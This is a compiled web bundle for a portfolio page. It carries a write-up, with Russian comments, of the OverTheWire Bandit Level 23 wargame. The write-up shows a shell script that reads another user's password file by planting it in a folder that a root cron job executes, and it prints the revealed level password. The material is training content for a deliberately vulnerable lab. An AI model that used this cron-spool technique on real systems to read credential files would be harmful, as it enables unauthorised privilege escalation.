"use strict";(globalThis.webpackChunkmy_portfolio=globalThis.webpackChunkmy_portfolio||[]).push([[2587],{28453(n,t,e){e.d(t,{R:()=>s,x:()=>d});var i=e(96540);const a={},o=i.createContext(a);function s(n){const t=i.useContext(o);return i.useMemo(function(){return"function"==typeof n?n(t):{...t,...n}},[t,n])}function d(n){let t;return t=n.disableParentContext?"function"==typeof n.components?n.components(a):n.components||a:s(n.components),i.createElement(o.Provider,{value:t},n.children)}},48160(n,t,e){e.r(t),e.d(t,{assets:()=>r,contentTitle:()=>d,default:()=>l,frontMatter:()=>s,metadata:()=>i,toc:()=>c});const i=JSON.parse('{"id":"writeups/bandit/Level 23","title":"Bandit Level 23","description":"\u043f\u043e\u044f\u0441\u043d\u0435\u043d\u0438\u0435","source":"@site/docs/writeups/bandit/Level 23.md","sourceDirName":"writeups/bandit","slug":"/writeups/bandit/Level 23","permalink":"/portfolio/docs/writeups/bandit/Level 23","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"writeupsSidebar","previous":{"title":"Bandit Level 22","permalink":"/portfolio/docs/writeups/bandit/Level 22"},"next":{"title":"Bandit Level 24","permalink":"/portfolio/docs/writeups/bandit/Level 24"}}');var a=e(74848),o=e(28453);const s={},d="Bandit Level 23",r={},c=[];function p(n){const t={code:"code",h1:"h1",header:"header",p:"p",pre:"pre",...(0,o.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(t.header,{children:(0,a.jsx)(t.h1,{id:"bandit-level-23",children:"Bandit Level 23"})}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:'bandit23@bandit:~$ cd /../../bin\nbandit23@bandit:/bin$ ls | grep "cron"\ncronjob_bandit22.sh\ncronjob_bandit23.sh\ncronjob_bandit24.sh\ncronjob_behemoth4\ncronjob_leviathan5\ncrontab\nbandit23@bandit:/bin$ cat cronjob_bandit24.sh\n#!/bin/bash\n\nmyname=$(whoami)\n\ncd /var/spool/$myname/foo\necho "Executing and deleting all scripts in /var/spool/$myname/foo:"\nfor i in * .*;\ndo\nif [ "$i" != "." -a "$i" != ".." ];\nthen\necho "Handling $i"\nowner="$(stat --format "%U" ./$i)"\nif [ "${owner}" = "bandit23" ]; then\ntimeout -s 9 60 ./$i\nfi\nrm -f ./$i\nfi\ndone\nbandit23@bandit:/bin$\nbandit23@bandit:~$ OUT="/tmp/p24.$RANDOM"\necho "$OUT"\n/tmp/p24.10015\nbandit23@bandit:~$ cat < /tmp/p.sh &lt;&lt;\'EOF\'\n< cat /etc/bandit_pass/bandit24 < __OUT__\nchmod 644 __OUT__\nEOF\nsed -i "s#__OUT__#$OUT#g" /tmp/p.sh\nchmod 755 /tmp/p.sh\nbandit23@bandit:~$ cp -f /tmp/p.sh /var/spool/bandit24/foo/.z.sh\nbandit23@bandit:~$ sleep 75\ncat "$OUT"\ngb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8\nbandit23@bandit:~$\n'})}),"\n",(0,a.jsx)(t.p,{children:"\u043f\u043e\u044f\u0441\u043d\u0435\u043d\u0438\u0435"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:'# 1) \u041a\u0443\u0434\u0430 \u043f\u0438\u0441\u0430\u0442\u044c \u043f\u0430\u0440\u043e\u043b\u044c (\u0432 \u043a\u043e\u0440\u0435\u043d\u044c /tmp, \u043e\u043d 1777, \u0432\u0441\u0435\u043c \u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d)\nOUT="/tmp/p24.$RANDOM"\necho "$OUT"\n\n# 2) \u0441\u043e\u0431\u0438\u0440\u0430\u0435\u043c payload \u0437\u0430\u0440\u0430\u043d\u0435\u0435 \u0441\u043e shebang\ncat &gt; /tmp/p.sh &lt;&lt;\'EOF\'\n#!/bin/bash\ncat /etc/bandit_pass/bandit24 &gt; __OUT__\nchmod 644 __OUT__\nEOF\nsed -i "s#__OUT__#$OUT#g" /tmp/p.sh\nchmod 755 /tmp/p.sh\n\n# 3) \u043a\u043e\u043f\u0438\u0440\u0443\u0435\u043c \u0433\u043e\u0442\u043e\u0432\u044b\u0439 \u0444\u0430\u0439\u043b \u0432 \u043e\u0447\u0435\u0440\u0435\u0434\u044c, \u0433\u0434\u0435 \u0435\u0433\u043e \u043f\u043e\u0434\u0431\u0435\u0440\u0451\u0442 cron (\u0432\u043b\u0430\u0434\u0435\u043b\u0435\u0446 \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u0441\u044f bandit23)\ncp -f /tmp/p.sh /var/spool/bandit24/foo/.z.sh\n\n# 4) \u0436\u0434\u0435\u043c, \u043f\u043e\u043a\u0430 cron \u043e\u0442\u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442, \u0438 \u0447\u0438\u0442\u0430\u0435\u043c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\nsleep 75\ncat "$OUT"\n'})})]})}function l(n={}){const{wrapper:t}={...(0,o.R)(),...n.components};return t?(0,a.jsx)(t,{...n,children:(0,a.jsx)(p,{...n})}):p(n)}}}]);